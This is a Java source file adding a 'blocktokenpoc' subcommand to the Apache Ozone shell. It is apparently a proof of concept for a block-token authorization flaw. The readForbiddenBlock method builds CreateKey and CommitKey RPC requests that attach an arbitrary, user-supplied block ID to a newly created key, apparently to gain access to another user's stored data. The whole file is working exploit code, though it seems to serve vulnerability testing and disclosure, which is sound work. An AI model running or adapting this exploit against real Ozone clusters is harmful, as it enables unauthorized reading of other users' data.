package org.apache.hadoop.ozone.shell;

import java.net.InetSocketAddress;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.Callable;

import org.apache.hadoop.hdds.cli.GenericParentCommand;
import org.apache.hadoop.hdds.cli.HddsVersionProvider;
import org.apache.hadoop.hdds.cli.SubcommandWithParent;
import org.apache.hadoop.hdds.conf.OzoneConfiguration;
import org.apache.hadoop.hdds.protocol.proto.HddsProtos.BlockID;
import org.apache.hadoop.hdds.protocol.proto.HddsProtos.ContainerBlockID;
import org.apache.hadoop.hdds.protocol.proto.HddsProtos.Pipeline;
import org.apache.hadoop.hdds.protocol.proto.HddsProtos.PipelineID;
import org.apache.hadoop.hdds.protocol.proto.HddsProtos.ReplicationFactor;
import org.apache.hadoop.hdds.protocol.proto.HddsProtos.ReplicationType;
import org.apache.hadoop.ipc.Client;
import org.apache.hadoop.ipc.ProtobufRpcEngine;
import org.apache.hadoop.ipc.RPC;
import org.apache.hadoop.net.NetUtils;
import org.apache.hadoop.ozone.om.protocolPB.OzoneManagerProtocolPB;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.CommitKeyRequest;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.CreateKeyRequest;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.KeyArgs;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.KeyLocation;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.OMRequest;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.OMResponse;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.OzoneAclInfo;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.OzoneAclInfo.OzoneAclScope;
import org.apache.hadoop.ozone.protocol.proto.OzoneManagerProtocolProtos.OzoneAclInfo.OzoneAclType;
import org.apache.hadoop.security.UserGroupInformation;

import com.google.protobuf.ByteString;
import org.kohsuke.MetaInfServices;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;
import picocli.CommandLine.ParentCommand;

/**
 * Subcommand to group key related operations.
 */
@Command(name = "blocktokenpoc",
    aliases = {"btpc"},
    description = "Block token retrievel POC tool",
    mixinStandardHelpOptions = true,
    versionProvider = HddsVersionProvider.class)
@MetaInfServices(SubcommandWithParent.class)
public class SecurityTest
    implements GenericParentCommand, Callable<Void>, SubcommandWithParent {

  @Option(names = {"--om"},
      description = "Ozone Manager host")
  private String omHost;

  @Option(names = {"--block-id"},
      description = "Id of the block")
  private long blockId;

  @Option(names = {"--key-size"},
      defaultValue = "3812",
      description = "Size of the created key")
  private long keySize;

  @ParentCommand
  private Shell shell;

  @Override
  public Void call() throws Exception {
    return readForbiddenBlock();
  }

  public Void readForbiddenBlock() throws Exception {
    OzoneConfiguration conf = createOzoneConfiguration();

    UserGroupInformation.setConfiguration(conf);

    final OzoneManagerProtocolPB omProxy = createOmProxy(conf);

    final int random = new Random().nextInt();

    final OzoneAclInfo acl = OzoneAclInfo.newBuilder()
        .setName("testuser/scm@EXAMPLE.COM")
        .setAclScope(OzoneAclScope.ACCESS)
        .setType(OzoneAclType.USER)
        .setRights(ByteString.copyFrom(new byte[] {-1}))
        .build();
    OMRequest createKey = OMRequest.newBuilder()
        .setCmdType(OzoneManagerProtocolProtos.Type.CreateKey)
        .setClientId("1l")
        .setCreateKeyRequest(CreateKeyRequest.newBuilder()
            .setKeyArgs(KeyArgs.newBuilder()
                .setFactor(ReplicationFactor.ONE)
                .setType(ReplicationType.STAND_ALONE)
                .setDataSize(keySize)
                .setVolumeName("vol1")
                .setBucketName("bucket2")
                .setKeyName("key" + random)
                .addAcls(acl)
                .build())
            .build())
        .build();
    final OMResponse createKeyResponse = omProxy.submitRequest(null, createKey);
    final long createdId = createKeyResponse.getCreateKeyResponse().getID();
    System.out.println(createKeyResponse.getMessage());
    System.out.println(createdId);
    OMRequest commitKey = OMRequest.newBuilder()
        .setCmdType(OzoneManagerProtocolProtos.Type.CommitKey)
        .setClientId("1l")
        .setCommitKeyRequest(CommitKeyRequest.newBuilder()
            .setKeyArgs(KeyArgs.newBuilder()
                .setFactor(ReplicationFactor.ONE)
                .setType(ReplicationType.STAND_ALONE)
                .setDataSize(keySize)
                .setVolumeName("vol1")
                .setBucketName("bucket2")
                .setKeyName("key" + random)
                .addAcls(acl)
                .addKeyLocations(KeyLocation.newBuilder()
                    .setBlockID(BlockID.newBuilder()
                        .setContainerBlockID(ContainerBlockID.newBuilder()
                            .setContainerID(1L)
                            .setLocalID(blockId)
                            .build())
                        .build())
                    .setOffset(0)
                    .setLength(3812)
                    .setPipeline(Pipeline.newBuilder()
                        .setId(PipelineID.newBuilder()
                            .setId(UUID.randomUUID().toString())
                            .build())
                        .build())
                    .build())
                .build())
            .setClientID(createdId)
            .build())
        .build();
    final OMResponse commitKeyResponse = omProxy.submitRequest(null, commitKey);
    System.out.println(commitKeyResponse.getMessage());
    System.out.println("key cretead /vol1/bucket2/key" + random);
    return null;
  }

  private OzoneManagerProtocolPB createOmProxy(OzoneConfiguration conf)
      throws java.io.IOException {
    RPC.setProtocolEngine(conf, OzoneManagerProtocolPB.class,
        ProtobufRpcEngine.class);
    final OzoneManagerProtocolPB omProxy =
        RPC.getProxy(OzoneManagerProtocolPB.class,
            RPC.getProtocolVersion(OzoneManagerProtocolPB.class),
            new InetSocketAddress(omHost, 9862),
            UserGroupInformation.getCurrentUser(),
            conf,
            NetUtils.getDefaultSocketFactory(conf),
            Client.getRpcTimeout(conf));
    return omProxy;
  }

  @Override
  public boolean isVerbose() {
    return shell.isVerbose();
  }

  @Override
  public OzoneConfiguration createOzoneConfiguration() {
    return shell.createOzoneConfiguration();
  }

  @Override
  public Class<?> getParentType() {
    return OzoneShell.class;
  }
}
